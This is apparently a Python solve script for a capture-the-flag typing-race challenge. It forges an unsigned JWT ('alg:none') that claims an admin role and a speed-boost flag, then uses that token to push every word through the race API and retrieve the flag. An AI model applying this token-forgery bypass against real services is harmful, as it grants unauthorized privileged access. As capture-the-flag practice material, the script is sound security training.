import base64, json, requests

BASE = 'http://chals1.apoorvctf.xyz:4001'

# Start a race
r = requests.post(f'{BASE}/api/v1/race/start')
data = r.json()
race_id = data['race_id']
words = data['text'].split()
print(f"Race: {race_id}, Words: {len(words)}, Multiplier: {data['bot_multiplier']}")

# Forge JWT with alg:none — set speed_boost to true to slow bots
header = {"alg": "none", "typ": "JWT"}
payload = {
    "exp": 9999999999,
    "iat": 1772900000,
    "role": "admin",
    "speed_boost": True,
    "sub": "racer_12345"
}
h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
forged_token = f"{h}.{p}."

headers = {
    "Content-Type": "application/json",
    "Authorization": f"Bearer {forged_token}"
}

# Type all words via API — bots are slowed to ~0.9 WPM with speed_boost=true
for i, word in enumerate(words):
    progress = (i + 1) / len(words)
    r = requests.post(f"{BASE}/api/v1/race/sync",
        headers=headers,
        json={"race_id": race_id, "word": word, "progress": progress, "wpm": 100})

    result = r.json()
    status = result.get('status', '')
    if status in ('victory', 'defeat', 'timeout'):
        print(f"\nWord {i+1}/{len(words)}: {status}")
        print(f"Message: {result.get('message', '')}")
        if result.get('flag'):
            print(f"FLAG: {result['flag']}")
        break

    if i % 20 == 0:
        marc = next(b for b in result['bots'] if b['name'] == 'Marc')
        print(f"Word {i+1:3d}/{len(words)} | Us: {progress:.1%} | Marc: {marc['progress']:.4f} | BotWPM: {marc['wpm']:.1f}")

print("Done")
